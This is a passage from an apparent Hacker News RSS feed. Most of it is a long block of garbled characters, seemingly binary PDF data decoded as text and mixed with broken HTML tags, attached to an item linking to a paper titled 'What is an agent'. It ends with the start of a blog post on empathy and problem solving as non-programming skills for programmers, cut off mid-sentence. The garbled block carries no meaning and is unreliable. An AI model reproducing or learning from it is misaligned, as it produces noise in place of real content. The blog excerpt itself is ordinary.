√ç¬Ø‚ÄùKL√û`$¬¨QM¬Ω¬ºG√õ&lt;√¨-*M-√Ü√Ø|≈í√ñ¬∞¬∫√ä√åj|√ßWd√¶y‚Ä∫∆í√û\‚Äú√°
D#M√∞$¬§√à¬´5
Y√Ä‚Ä¢¬∂√∑√û¬∫√ô‚Ä¶‚Äù√ï√∞√ë√Å¬ø‚Äù‚Ä¶√Æ√öÔøΩ√óh¬±¬§¬º√¥T√ô|√≠N√´√±.Àú‚Äò√Ωi¬Ω?ÔøΩ1√ö&gt;QXt√ª√úf‚Ä¢=≈íS&lt;√Ø√ä%√é√Ü2¬™¬®HV√ΩF√ã*,6‚Äö√∂:)r¬ØÔøΩ‚Äìl√Ü√îT=√®d√á:2
)OK¬∞‚Ä∫f%dC2√â¬©¬©‚Ç¨%‚ÄùÀÜW¬ß¬ØgC¬µ√™√§√ô-√ñAc√ÅÔøΩ|=C5√Ü√¨*‚ÄîÔøΩ5¬∏OK√à5√Ü√û¬™ÔøΩ5√õ¬π¬§√µ√É√†e¬≤¬¶k√°√®√ÇZ√é¬≤}¬∂√†30;¬æ¬ø&gt;¬®ZT¬®√™¬π,√ª√õ^rH%‚Ä°‚Äî¬∫‚Ä†√§√ï¬¥√§(LZ√Å5&gt;~√¨FTcZs√Ω‚Ä¢ÔøΩ√£√ÅE√öw¬™√èk¬∏≈°l√¶¬§√å¬≠?¬º$*"¬∏‚Ä°‚Äô‚ÄôPqTA/P!/≈°√¥
o¬ß√≥‚Ä¶`D¬•4P√ë¬ßBw≈ì;∆ía√©√û√´¬∞.√∫^‚Ä¶(√≤Z√∑R√≠fR√•√≥√•o√¶¬≠¬∞√Ö0√é√≥
)¬≤¬´√Ç"G¬¶√µj/√©^√ó¬æÔøΩ√Ü√ª√±‚Äù¬æ≈∏ÀÜ¬¶\r√ö√•&nbsp;s¬∫√ü^√ØWrk∆í‚Ä∫¬º√âÔøΩ2%sb√Ü¬µ√ê≈ì√î#¬∑L√†√õv#√≤C√õ√™|√ì¬Ø√ÆV=≈Ω}√å√ç:¬º¬¥GC_kJ=√∏6qe√´cH√≠im√•1‚Äú√äV=r√ìQ√è√©]√üq+¬≠+ÔøΩl@≈†√¥√Å(\‚Ä¶Àú(IU√ÑXM≈æ\≈ìzf¬ª¬£*,=√£‚Ç¨√®c√ßcÔøΩU√éS,√å_√Ç√Ñ@m≈ΩB¬£≈†√å√Ä‚Äú√•*¬¨¬ø\√•x√ß-8√ø!√ï√∏¬¢¬¶C¬¨{√õ¬∑O√πZ√©`3≈ì¬¢¬®√ëm¬§√°*ÔøΩ&amp;ÀÜ¬°√Ønf√µ√Ñ.	‚Ñ¢.≈ΩGM√ºK√¨%Y√ïR√µÀú+	x!√≠ÔøΩ√∏√¶GÔøΩ√∑√µ√ê¬´‚Äú√°-√ã$∆í≈æ√îcV‚Äù√º`√©fkBJ√º¬π+R\¬π√•√¥¬°L‚Äòz√ã¬°Ef¬¥≈°¬∑√™≈ækÀú_i¬ø‚Äô√ª7‚Äû¬≥¬∫√∑√á~√Ä¬≠6b√®¬∑c‚Äö√ôLD≈°¬§xm‚Ä¶√É√ò√Él√£√ì]f\√®/√ã,√Ç¬ø¬Ωr√°√á√ü‚ÄùX√≠¬®√ÄB‚Ä∞¬™{&lt;‚Äû√óK‚Ç¨B√©¬≠≈æ¬®√úm≈Ω√ùu√∂√ñ‚Äû√ôF^√Ø¬´√±√°5√ÆT≈∏C√ãzH
√î_‚Äú√∑‚Äπ‚ÄöÀú‚Äî‚Ä¢.J¬ª√ª√ÄSL√ü√ÑÔøΩ¬π¬¨√°F‚Ä†¬¶,~¬ª#‚Äù√ós¬∑¬§√Ç√•‚Äû√´√ã√£VÀú√ñ√∞√∫¬∂‚Äú√•$Cj√æY√Ü5ÀúQ√ë√ò1¬®	¬πC0‚Äì¬¨J√õ¬´)√áC¬Æ!√ªfCR≈í√ÇNH√≤√Ä√ê√ú{|≈í√ù;¬∏¬±√ø~)O√°]m√ØB‚Äù‚Äö0@#√ølN9^~4√¨UrFtweV	}7Cp"√•√ä'√¥ F¬≥√§√¶g¬§√ù=I‚Äπ
z$√º√É√é:P	¬¨√í√∑p09ph‚Ç¨ÔøΩ√é√∂s√≤√ê.zG≈ín¬´!‚Ñ¢≈∏√çR5√Ü¬≤√Ö=^√æzY_z¬¶¬°5v0√û6(eA(√ü'I¬¥ÔøΩ‚Ä†¬∑}√É&nbsp;}¬≥¬¶√¨l¬±¬¨¬≠√Ø$8$‚ÄîÔøΩ√ì√ºY5=‚Äú4¬Æ√çN|k√Ü√≠a`¬µs_&nbsp;√É√ë¬´≈ì√§G√è&lt;√®¬£UÔøΩx	1M√ô≈æ]√Ü≈∏‚Ä°√Ñ√§‚Äú√Ñ√ëFG√ç√π√Ø‚Äπ¬±b√¶t
√†¬≤‚Ä¶‚Äπl4iw√ÇZxjB√ë√ö√Ñ√õ|&amp;1(]ÔøΩ)MRB‚Äö4u&lt; e¬∑R√õ≈†√Ω8%¬æH75Z√îp;~	~E¬Æ¬≥T√≠!√í√®‚Ä†√∑¬≠√£√ä√Å√ô	;"&amp;K ≈∏a√•ÀÜJ≈æ¬∂O√Ö√ö#¬¥√¥√®e¬®b¬¶n¬∞F+¬ø√ñ√ó√è¬º√ï}¬∞\N√êJte#3L√Ωh,√≠ÔøΩ√û¬Æ√Ω&amp;:¬≤‚Äú√æ¬≠‚Äπg√â√èÀú|.¬¢Fm_√â~√¶r}$d‚Ä∞2a√Ö√¥‚Äπ√ë√Ü‚Ä¢¬±HO√ßO[
,√ß√ó}√π
S¬§fU‚ÄôZra¬∑+√º+C3≈Ω?√èIIX√∑Qp√∂≈æ@√™E√¶‚Äú√ëK‚Äù√ì¬Æb¬ª‚Ç¨√ö¬∂¬Ω|√≠IX1?√®¬©√ñ¬≥√≥ ¬∫≈∏√Ω√π√£S≈æ}|7‚Äî#?WtH≈í¬º√§tL√ç[Tg‚Äú}Y¬∂¬¨#%√∑¬∏}M√ù&lt;√†√Ü,√ÇF√≠¬©G+¬ªW√Ü√∞+`VQ‚Ä¶‚Äú√†p√¶ÔøΩn√ê≈∏tW√é{√ê¬•¬ª¬™¬§*¬£!‚Äú¬ªO≈°qi[√ì¬ø¬µz√ä√ø¬©√∂√µ{√®¬ºPd=‚Äö√•q‚Ä∞w√å√§¬∏`‚Ä∞√à√ã√ë?Z√Ç‚Äö√™"‚Ä°‚Äπ‚Äûg√Ö√Ø¬∫r√•¬Ω\+≈∏8√ó√ä¬¢√ù¬º√Ö√∫`¬©¬´c√ö√º
¬ø≈Ωw√äKcÔøΩ√¢¬ß\]‚Äô√£¬∂Ie√†'%¬¶=vQ√º	
‚Äò‚Ç¨'√Å≈∏2≈Ω√ù‚Äú√ù&nbsp;¬∫-¬µ√üB√≤ÔøΩg¬¥X)q¬°¬∫^J0√ó√π:√†√¶√ç√æ‚Ñ¢√è√π√ò√∂uhPy≈Ω¬¨‚Ç¨¬¥√ÇE&lt;¬Øa√æS|√§5√¥√≠√†tt√´	}√ç‚Äúr¬Æ6}Z√¶F√∏¬§√§bdtb5
,√±g√£!√ã¬±√îb√Æ√µ
¬æ‚Ñ¢#s√∏!ij¬±√ë‚Ä¶#)√≠ÔøΩyEc(fh√ï√öeN‚Äô]z‚Äû¬´¬§_√Ñ¬¥√Åp&amp;pFi\≈†√ΩÔøΩF√É¬Æ√©_√øl¬Ω¬±√ÜMe√µ√ç[√é¬µ√¢0√°√∑dÀúc√ñ_¬™‚Äî√å%√íst‚Äû√Ü=y¬º¬™9¬∑√ï	¬¢¬ÆO√ì@!E¬•¬∏√êH√©¬≠¬¢‚Ä¢¬ß¬∂√°T¬π√ª¬¥:¬•(ÀúP¬ø-%¬¶FA{√∂p√§¬ªÔøΩ√ÄNl√ëw<s√±√≥_√É¬ª√Üie¬Æ√ò¬æes√ûf√ØÔøΩ√´√•`√®√°¬®¬ß√ß‚Äûi¬Ω¬≠¬±<tÔøΩ‚Ä∞*¬¥√¥ÔøΩ√µ¬ªc√ã√é‚Ä∞√≤√ÜÔøΩ>$√£√äJ√Ü√æ∆íB√¢¬ªb&gt;YL#k¬±wl√çIY‚Ä∞¬∂`√ï=¬∑O√≤√êBP;√∂yÔøΩ√¢√¢√ÖkÔøΩ√ä‚Ä°≈†7≈ìq√≥¬µ√ùo√îL2[√∫√£√ú9¬≠√≠√éeÔøΩm=√ã√•DWG‚Ä°H√Ç"√∞√∞√Ñ√¥\ÔøΩe√å‚Ä∞B√áQ√ã√Ç
&nbsp;"¬Æ-‚Ä¢√º√ç¬©!√öj‚Ä¢
"√µ¬Ø]{√∞Z√àmd¬æp√®Àú√µ√û√õK/‚Ñ¢8‚Ä°¬ªJ3}√≥.Nr¬£y√≠H¬ª√∏6≈ìd¬∑¬¨<r√æ√¨¬°√±t‚Ä∞‚Ç¨√≠r√Éq<√Ö‚Ç¨ÔøΩay,∆í‚Äò√∞ $√ã¬®√£‚Äù√Øe‚Ç¨√ª‚Ä¢√èxn√ñ√ªr‚Ç¨(√∫¬†√ò¬≥√•¬æÀú√ïÔøΩq√©ÔøΩ¬Ωsf√±¬•√ñ}¬®x√è'√ä√¥5‚Ä¶√ú‚Ä∞="" rg0√´zÔøΩ¬≥z4="" √öf√Åx7f‚Äì)≈°lw√Ø√á¬±w¬π¬™‚Äöb¬µ2√¢‚Ä¢¬ßm√Ä√≥¬¢√≥lÔøΩ√Ä√´b√ß{√°'¬°√±o¬±<¬µ="">sÔøΩ(√ñ√únnkQ¬≤√î√õ≈°¬±$h"‚Äö_$¬¥moR:√ôv√ä:b~.$‚Äì‚Ñ¢√ã√üh¬¢h‚Äì‚Ä∞¬≤Àúh¬©√ü¬ºGsjH√ä√∫¬•≈ìÔøΩ√©√∫√É|PmV√¨√ú¬ÆB
√¶‚ÄòD√æ¬®E√¶‚Ä∫¬ß¬π¬æ≈æh‚Ä°‚ÄìÔøΩ√ç√§√∂‚Ä†√å¬¨¬πv∆í‚Äö'c√õ√É√ë9CG¬Ø‚Ä∫¬™¬∑√ïi‚Ç¨mÔøΩ‚Äî‚Ä¶√≥¬¶√£√Éw.∆í√¥√ã¬ß√±¬ß√é√≠√òo¬∏K√¥L:O1≈†√ß√Äa‚Ä°l√∞√∏¬•w‚Äπ-$¬π
x√∑MS√úlA¬•√Ø¬µ8‚ÄìN?‚Äì√•√Å9¬ß‚Ä∞6
√É]√ß‚Ñ¢p√´√ª√ë√≤√Ñ6‚ÄîO‚Ä†&lt;ÔøΩ¬¶9√§√áFP¬ª-da∆í-5√á√º√ù6¬£m2√ê?m|√ò¬£FÔøΩ√Ækg√û√∏√äw√™?¬•¬Æs√ì√ÇcK¬≥^∆í√ª√¶‚Ä∞√∞≈Ω√∫ÔøΩ√ø@~≈∏]√†I√ê√•s‚Ç¨G‚Ä¶IÔøΩ√ì	¬ªK√ß√¢=√ÜL¬∞u¬¶‚Äú√Å7¬Ø‚Äù‚Äì√ñ√û¬π0¬Æ&nbsp;√ò¬Æg6K
FN¬§	√≤F√¥¬§Ey≈†8mtV√º√™(ÔøΩ¬∑x√õ√ë≈ìÔøΩ√π√π¬´5¬®√é¬≤‚Äò¬∑h‚Ä∫√¨n¬∫L‚Äî8√ïT‚Ä°¬¨¬£√Ä']az∆í 8√ª=j√¶√ªP‚Ä°‚Ä∞[=1√•¬°VJ¬º¬¶y√±√åL√è¬ø√íÀú√©¬ªn¬®¬£√ªE¬≤61√µF∆í¬ºJ:√•Àú}ÔøΩ}√ó√∑2√á¬Ω√ó?{E/[&lt;√∑,w√Å¬±‚Äò√è√ä√¥|s¬∑√ûSy√µrg¬•¬µP‚Ä∫√∏√±i.¬≤|√ù√å√ó√ì≈ΩW√ÆiE√∂R√çY‚Äì√°I√π√†¬∏7Z¬µ√¨ÔøΩ,Z√ï¬≠√É#R√òM≈†‚Ä†N¬©j√Å‚Äú√í(‚Ñ¢¬π‚Äò[MG√ó¬•h¬´IoX{c√¨=√é‚ÄòX¬ª√®d‚Äò#Àú	cC√¢fXn√¢√Ö¬¨M¬µp√ô?√°|¬Æ¬∏√æy√û¬±√±
}¬§¬ß‚Äî4u≈†√â7√≠ql~:c√äVM+√©Rkh‚Ä¶√Åg¬•Àú√å√§√≥%¬™¬¶8ÔøΩ√¢R√æ¬•‚Äôw√å√ß√ßÔøΩ{z√µ√£S‚Ä¢#√à√Æ‚Ä∞&lt;}¬Æ¬∫¬±‚Ä¢¬Ωr
√µn√¢√ò!¬®bb√ûk3ÔøΩi?_¬π:√î√àvi√çv√ù9√û¬Æu=&amp;√ã[K√Ü@0√ñ&nbsp;cR≈Ω#¬øl¬∂√î6√´√£P√≥√∫√ï]*√üII[¬¢√®¬Ω4≈Ω+;√ô√ï6√ØH¬´¬ßZ65‚Ä∫%√¶S√±√ú√ì}‚Ä¶≈æ¬≥√õ√é8*Iu≈ì√ïu|¬∫√µ(√É√ØQ$√ï√á√Ñ≈íhM‚Äìu6nd√π¬π4Bm√∂?{"=√ÜR8O69√§%(√º0m¬¨¬°"OC¬ª√π√æ¬Ω=%Yl¬±?=√±‚Äò√™)¬°¬©‚Äî¬ºB√¨¬™7d√ìR\Àú¬°\‚Äö&gt;¬≥2√•d≈∏√ês√£?&gt;ÔøΩ√Ωn√≤≈ì¬æ¬µ√≥√ï9V-ÔøΩ√•-Qlj√¥¬´¬§√£√±$‚Ä†‚Äô2√ø7√ß:√™pa,f"‚Ä°¬∏√ãJ¬Øju~√ª√õ¬∏v^K√û‚Äπ<do ¬∂%√•√±√∞‚Äπ¬®¬º√ù‚Äπ√Üh√õ@ÔøΩ√≥ÔøΩ\‚Ä†√®√§¬Æ1√Å¬ÆÔøΩ¬∑h?i√ñ¬¢√ú-fpz¬Ω√∑√í√¥√†√î¬∫√Çwd√≤¬∂≈Ω√â√ç¬º7(≈æ√©¬´rz√Ø&z√ã?√≤z‚Äöh√†¬∏√®√É√â√â√º‚Äπ√ô√¨¬≥¬¢p√û`√ù,="" ¬Æa="" v‚Äö¬ÆÀú$√ì√æi¬≥≈æ\+√É¬µb‚Ä†"ÔøΩo%¬Æ‚Äπd√†¬æ√Ø√Äd√õ‚Äûn¬ß‚Äûux√á4¬∂‚Äö|n¬£+√¶¬Æ\√º¬∏√∂‚Äù‚Äìh{√¶‚Ä∫6!≈°d√±r√í.√©√ß¬±\√É&trq?¬∫$g9√Ω‚Ä¶‚Äì'-√öÀÜ;≈°√ç\‚Äú√™√£¬µ="" b"‚Ä°√Å¬¨f√ø√ß¬®√ö‚Äö√¥√É;rd√ÜÔøΩ‚Ä∞‚Ä¶√Ø.[√õ7√≤at√å\√ô√â√•y¬§¬≤ÔøΩ√è¬∫;√ß¬∞√ã√è√´√ü√Ö2√å√ó¬±¬Øc√°~{¬π√©7p'√ä]"√ë√éf√®w!√ú~n@‚Ä¢√∏¬≥u√†="" √õ9dÔøΩÔøΩ‚Ä¶¬º%¬ß√º[√ó:¬æ√ä8}‚Ä∞√ívf¬¶ÔøΩ$‚Äì√Ç{1="">‚Ç¨√Å¬µIx¬•≈°√ç√™¬∞j√ä¬£TZ^I√îÔøΩi√¥√£√π√∏&lt;≈æ√õ√§S‚Äò√Æo√á:‚ÄûOd5cDyb√Ç¬µcfS√ü√öT#√ùL√ê√ÉB^`¬µ?n=¬≥K¬¥√é√ó&nbsp;0c√é√¶Q√±CÔøΩ&nbsp;¬æ7t√ë√Ø¬æw|3pw,b√¨AMi	√±‚Äùg‚Äû√≤¬∞√©¬°o:‚Äî√î¬æ¬≤√áNt√ç¬ª√≠√ª≈†√Üj√ê^{G√ûA¬ºz¬ª_¬º√ú‚Ä¶√ò)
	‚Äû8≈∏√à√ñwg¬¢fS√ûo √Øs¬®√ù∆í≈∏1e¬≠√ë?√å√üE#√ò√π?9s*eeV√Æ‚Ä¶≈íZÀÜ√ªi0M‚Äû√Ü)√ô‚Äö¬¢o√∞j¬µ≈°√±H~E%j√Æ√∂ÔøΩ≈ΩV√â√Å84E¬™√º.¬ª√•∆í/6¬ß_ÀÜ√≤√±‚Äπ[IVcÔøΩD3¬≤‚ÄûF√∂l¬Ø&amp;+A(√øÔøΩ‚ÄπZ≈†Ji√ø la&nbsp;4/√éE`√ÑV(y‚Ä†¬£¬¶¬∂√§|¬•‚Äî_¬™¬´√π¬≤¬ßw¬¢√†Ym√æ¬±√±X‚Ä°¬Æ‚Ñ¢‚ÄùY0√™j√Ω√§¬±ÔøΩs√ïe,f√§√í¬§√´√£¬∫C√•¬ª√óÔøΩ‚Ä†‚ÄôcÀúq¬Ωsr√§/H√≤g√∑√äU√≥‚Ä∫¬≥√ê√à2√ö√Ñ‚Ä°"ÔøΩP&lt;√±SM√¥&gt;√Å√∞E√¶√∫pQ¬´i¬ø√ìXL√ñ‚Äî¬∞‚Ä¢O¬¥Zb
W√ú‚Äù$¬©√≤¬Ω¬¶¬≠√¶¬ª3√ã^	[√ªf≈ípp.√û√ù¬º¬£O √ä√±¬§a¬æ‚Äùi¬£‚Äò√É)√Ø√ò^√ä,‚Ä∫¬ØP¬∫0√´√µJ √à¬æ√ñU&amp;8≈°J√∏√Æ√©√∑qUÔøΩ¬°4¬¨‚Ä¢z≈†√±‚Ñ¢.¬∂#√úYj√àÔøΩ√åo√¶≈ì¬°/√ÆI≈°√ùA¬∏!cm√ü‚Äôq¬∏‚Äö√™‚Äì*a√±#√§u¬≥NT-√ï\√î‚Ä¶X‚Ä°√ã3√åS$F√£@¬´`√Ü√∑√ô(√å√Æ√©N(u≈æn√å@{√ÖP&lt;≈Ω√∫√Ç√ïO¬∫¬æ¬®\_3√ç¬§√ìV5≈ísh√û6√†.√ëPÀÜY√Å‚Ä¢¬∑r7¬π/√¥e√úw√¨¬ø√Ö≈ækjT^√µk√∞¬ª√ñjl‚Äô¬ø4¬®≈íÀÜÔøΩ ≈∏V≈†zM/√∞¬∫¬∞I‚Äú¬Ø)¬¢√Ä√§sV)¬´ÀÜ√†p√¨¬¶d√¨√í¬∑≈°xG	¬ª√ô‚Äì`*¬πbh√é√Æ#s+a~y}≈ìE‚Ç¨√£√ÄE√ôT≈ì¬≠jN&gt;{¬ØU
w&amp;.¬´Àú√ì√¶R√∞√Ωdp¬¢¬µ‚Äû√õ√é^√®"¬¨;
¬Ø39)n-¬°ZV¬ß¬∂z¬£~to$$\≈í¬≤‚Äπ3¬¨¬°√ä√º√Ö√ü‚Ä°√≤d√ò√ä√ëk¬¥√Ö√´'R{√ó,8√µ√∂(¬¥‚Äú1¬¢=√§U¬™"√∞√†'‚Äòw√≤√Ω√≥√é¬©√∑‚Äö:√ä¬∏}√éj√†‚Äôy√¢r√õ`(√ç‚Ä†P‚Äî¬∏VC‚Äì¬≤Q√∑h,¬πc(√∂¬∂‚Ä∞‚Ä∫ÔøΩ√Åb‚Äì¬≥o√ø¬ª¬°‚Äò‚Ñ¢n¬Ω√°¬™|≈æf¬¨H/√öÔøΩ√¥]¬¥\hR/L√´‚Ä∫√ú¬≠√∏r√°¬¨‚Ä∫4¬•√Å'B¬∂√´‚Ä¶7y√ïÔøΩ√µ√•√ô¬≠¬ª√ù‚Äû≈°¬¥√ß‚Ä°G#w¬Ω`√†K‚Ç¨ÔøΩ¬µx¬≥√É√ç√ó√óvXÔøΩ4m√É√µ√Ü)f¬π¬´√äO?H¬Ø ‚Äû‚Ä∫f√ñ&gt;''√ªX‚Äî‚Äò‚Äò.√£K‚Ä¶A¬¥|√§√Ö
√í‚Ñ¢TÔøΩJ9^√ù√∑{0¬æ√ï√Æa¬´√°√Ø\?QZ¬Æ‚Ä¢≈Ω&gt;‚Äî√Ü‚Ä∞}‚Ñ¢L√π√°‚ÄúNi√û‚Ä†√ï√ç
¬æ√ó¬°ÔøΩD_\ÔøΩN√î√¨gG√èh≈∏IÔøΩ¬∞√óE#‚Ñ¢¬≥¬µ√æA&amp;¬∞Qp‚Ä¢√∫¬ªÔøΩ√Æ:√•¬≠L¬Øx√ï‚Ä¢√É‚Äû∆í√ãh¬¨ÔøΩ√£¬Ω89h‚Äò¬ß
‚Äö√îH√ñ≈æ¬∂xC∆íO√í¬±o√´¬ß∆í√û¬®9h√è√ä‚Ñ¢}XA√ù√£r3‚Äπ:√ö‚Ä∫Z≈°¬π¬Ø]^yÔøΩ√¨√´¬™√ò¬¢pr√íÀúk&lt;¬Æ‚Äô\√õ√£ÔøΩ¬øm√ùg3¬™Fx√Ø√™{‚ÄùÀú√ëe}G~√¢\%√∑√Æ√∫ÀÜ√≠k∆íz‚Äû
√éP¬®n‚Ñ¢*√çh6}?√øsz!T|MM‚Ñ¢sE(e¬°@"√Üs~√Ωsen5QS√™¬≥√∫√ï¬≤y¬Ø√ØG√Ø√≠3≈†¬¥ÔøΩ‚Äπ,√í√§R√£=r√êd‚Äúi‚Äô√ñ$¬ß√ë√óXÔøΩ¬®l‚Ñ¢√°√Ä√≠√©√á√π¬™√Ñ7\¬Ø¬æey=√õ	√ÉY5√öq¬ª√ù[¬°¬±3¬∑≈†√†‚Ä†√≥‚Ä†√õ√ó√∏J¬∫hL¬≠.√∂√æ√ñ¬∑√¶‚Äùb√û√¥∆í‚Äû[√∞"5¬∏ÔøΩ√ºT√ñ√Æ√∞√âN(~≈†z¬®;√ä~ÔøΩ≈°594√ú√ñ¬∑V¬®√π.¬¨N=?¬¨r√©b0Àú&gt;{√∞i"4. ‚Äùo¬´√π√™-√Ü\√°|‚Ä¶√ã~√¢√£‚ÄùJP√´√åLpÔøΩ√§¬£:t&lt;√Ñ‚Ä¶√ä‚Äò¬≥√§!√íb√É√Ω‚Äû√ì√éJP¬Ω√ô‚Äì√ò¬πn¬™√å"[}!i√Ö~√èR¬™43;ÔøΩ¬Ω¬æh√¨Y¬ªh√î¬∑]√±√æn√±‚Äì¬´√ô√õa‚Ä°}√Ω¬≥‚Äö√∑Z≈°}?√ó‚Ä¢‚Äû√Öw≈°√Ç√∏√É√ªH√±≈†E√Ñ¬ºX‚Ä†√πX¬∑√™√±‚Ä¶√†≈ì*¬µEm‚ÄùNEN√º|√ê¬ø√ÑDq¬≤V√Ä
h≈∏√Ü√Ö+¬£√êFgZe(‚ÄπK√Æ‚Äù√Ω√â≈ì0X√∏¬∫
l√Ω√à.(‚Ç¨y√§¬∫√§√¨√´K6√•"
¬¶&gt;¬ß¬¥r‚Ñ¢it√â√∫¬≤U√æ√ÆÔøΩ√à4"¬±?$√ê]‚Ä¶"√ï¬π¬≤¬¥ÔøΩ‚Äπ√ä9*¬µ√Ö~l√ã≈ì¬≠√è≈ì:‚Ç¨e¬±[√í¬§¬ºfg√Ä-/ P√ùP¬®¬¨‚Ä∞Àú¬∫√ÜÔøΩ√ø√ÖÔøΩ≈íX‚Äπ¬ºn√è¬™¬¨√Ç√é0≈°√¢≈Ω&gt;√ók√•‚Ç¨,S-w_√ì√¢,f√∫¬°√†D0ÀÜXvÀúe}√™
^√Ñ¬∑t√åiw≈†a¬∫‚Äò¬∑y√é√Ä≈∏≈°√£≈Ω¬´T√îZ¬ª#ÔøΩ√ç&gt;‚Ñ¢Im√ß5¬≠I√û	:‚Äî√¢√Ä?√ò‚Ä†√•e√ß√¢-ÔøΩT¬Ø0.f3Z¬≠
‚Ä∞Àú‚Äû√â√πnm^n¬°‚Ä¶d≈ì="`√≥√¥¬¨√ø√å≈ì%√∫|E√ñ√∫√åMN¬øA√Ω‚Äπ¬¨PUr.-~rD¬≠b¬´√á‚Äùk'‚Äû‚Äûq?√å¬£¬ªK√åY‚Ñ¢‚ÄôRh≈Ω‚Ä∫‚Ä∫F≈∏Àú≈æ√à√§A#7¬≠√Ö≈†d‚Äìm&amp;sU&gt;.√¨¬§≈†X√´¬∞r≈í≈ì√Ä&gt;b L-¬≠√ëI√ò√ì5¬•¬©^p√∫√ºÔøΩF√ã√πl√é√ô.B∆í√†XGR¬ΩH¬≥{‚Äì+5'?e√†]√ÑÔøΩw√Ω‚Ä†√à¬∂XS‚Ä†‚Äì¬¥√Ñ¬∫√Ø¬∑√§√ø√ó√Ç7¬ª¬±TZ¬Ø√ºh-n√õ+√ü}1√Åw¬ª&lt;‚Ä†7≈æ‚Ä°¬´≈°√ê≈†√üS≈°=¬ª"√á√¨√ñ√æq√§√ä‚Äì¬∂&amp;√ø‚Ä¢¬°Xm[‚Äö+¬≤e#√êrwU¬¶T¬∏`√Æ√à√≠9Js4¬±\[√ë√à$¬∑;√æbi]√ío√±#iS‚Ä°LÔøΩ
b&amp;&amp;8‚Äön)‚Ä†J¬∏√≥√ºq√•‚Ä¶</do></r√æ√¨¬°√±t‚Ä∞‚Ç¨√≠r√£q<√•‚Ç¨ÔøΩay,∆í‚Äò√∞></s√±√≥_√£¬ª√¶ie¬Æ√∏¬æes√æf√ØÔøΩ√´√•`√®√°¬®¬ß√ß‚Äûi¬Ω¬≠¬±<tÔøΩ‚Ä∞*¬¥√¥ÔøΩ√µ¬ªc√´√Æ‚Ä∞√≤√¶ÔøΩ></sgwd@ÔøΩb√®n‚Ä¢¬≤5¬™k√µa√®√¥√¢%dÔøΩ√≤√≤√¨rz></j√ª6√®¬≠√∂‚Äì¬πw√∑)√©‚Ä¶g?√∞√≤ÔøΩ¬µ*9¬º√πn6x√π‚Ä¶√Ω,]m√ß√¨></c\√ø√ßÔøΩ√ø‚Äö~‚Ç¨,k√©√æ\o√ß"c√º#√™s√πy‚Äúu¬¨hc√§i%√∏¬¶7k~|√π√¥zw√æ√πendstream></u√±\c√∂√¨oppr¬Æq≈°-ÔøΩs!=5‚ÄùoÀú√°4√®></n√ªp≈æ√•√Æw≈ì√¶√Æ√§√∑≈°√≥√®√§tÔøΩ√¶eq¬°{√¶√∞5u\‚Äù¬™‚Ä°¬ÆÀút‚Äû¬π(ÔøΩ¬≤‚Äún√≤xgw¬¥√≠‚Ä¶@¬©rr√æ√Øoyhr√™√†√ß+‚Ä¢3‚Ä†{≈æ¬°ÔøΩ√º√∞ad;√Ø√ßÔøΩ¬≥√º√ßÀú¬Ω√ß¬Ø√£,√≥¬∞a=#"nÔøΩc√¢√πs></wxx≈°√•i¬π√π¬©*¬Æ√™‚ÄùÔøΩz[a√´√Øfz√¶¬≠*¬£√≥2p∆í?p.≈ì¬≥q:√Æ`√ßzÔøΩj√æ√π√´2x√æ¬©‚Ä¢¬∞¬∏js√ßu¬°></f2082c8253a21bcf7efdc822f55d67f3></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://anna.harutyunyan.net/wp-content/uploads/2020/09/What_is_an_agent.pdf">http://anna.harutyunyan.net/wp-content/uploads/2020/09/What_is_an_agent.pdf</a></em></p>]]>
            </description>
            <link>http://anna.harutyunyan.net/wp-content/uploads/2020/09/What_is_an_agent.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577896</guid>
            <pubDate>Thu, 24 Sep 2020 12:25:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Important non-programming skills for programmers]]>
            </title>
            <description>
<![CDATA[
Score 88 | Comments 70 (<a href="https://news.ycombinator.com/item?id=24577876">thread link</a>) | @IncRnd
<br/>
September 24, 2020 | https://welearncode.com/most-important-nonprogramming/ | <a href="https://web.archive.org/web/*/https://welearncode.com/most-important-nonprogramming/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><a href="https://welearncode.com/">‚Üê Home</a></p><p>When I think about who I would like to work with as a programmer, I think so much more about non-technical skills than technical skills that make somebody a good co-worker. In fact, all of the skills that are in this post contribute to writing good code that improves technical projects. Most of them are really helpful for careers outside of programming too, but I'm going to focus on why they're useful for programmers specifically.</p><h2>Empathy</h2><p>To build a great product, you must put yourself in the shoes of your users. How will they be using your product? What features will be helpful for them? How can your program help them or improve their lives? And -- conversely -- how could it harm them or negatively impact their lives? What are the ethical implications of your application?</p><p>Empathy is essential for so many pieces of your programs -- if they aren't secure then your user's information could be used negatively by a third party. If they aren't accessible, then you are limiting the number of people that can use your project. If they run slowly or needs huge amounts of bandwidth to run, then users will leave and people in areas with slow internet or mobile users won't be able to run them. It seems like every day an article comes out with some harmful algorithm a company has implemented, like the <a href="https://www.theguardian.com/media/2018/sep/18/report-youtubes-alternative-influence-network-breeds-rightwing-radicalisation">YouTube algorithm radicalizing the alt-right</a>, <a href="https://www.inc.com/guadalupe-gonzalez/amazon-artificial-intelligence-ai-hiring-tool-hr.html">Amazon creating a sexist hiring algorithm (which they didn't end up using)</a>, or <a href="https://www.youtube.com/watch?v=QxuyfWoVV98">AI misgendering black women</a>. Think about everybody when you are writing your code!</p><p>Also, empathy is helpful for being a team member and a mentor. Put yourself in your manager or another developer's shoes. Why are they making their decisions? What can you do to help them? Having empathy will definitely improve your ability to be an effective teammate. If you're an employer, you can retain your employees for longer, and they will be more effective workers if you display empathy <a href="https://www.forbes.com/sites/karenhigginbottom/2018/05/31/why-empathy-matters-in-the-workplace/#386ca65d1130">(src)</a>.</p><p>Have patience for other programmers, especially ones that are learning new things. Remind yourself of something that was really hard for you to learn and how that felt. They probably feel similarly. Being rude to them, diminishing their progress, or being pedantic will only be harmful and make that process harder for them.</p><p><strong>Your words and actions have real consequences -- you can use that to enact positive change or hurt somebody. That doesn't end with in-person communication -- online communication counts too. You may think you're being funny or just letting off steam, but you may actually causing a very negative impact on someone's life. It's up to you to decide how to act, and how to apologize if you hurt someone to undo some of that harm.</strong></p><h2>Problem Solving</h2><p>When I teach people to code, I see a lot more people struggling with problem-solving than the code itself. The ability to break a problem into smaller ones and then solve all of those smaller problems takes a lot of practice. Getting good at problem-solving can help you become a much stronger programmer.</p><p>Also, for most problems, there will be more than one solution. A large part of our jobs as software developers is to think through those different solutions and choose the one that is best. Is one faster to implement? Or does it run more efficiently? Or will it be less expensive? All of these are important questions, and picking the correct solution is a challenging but important part of software 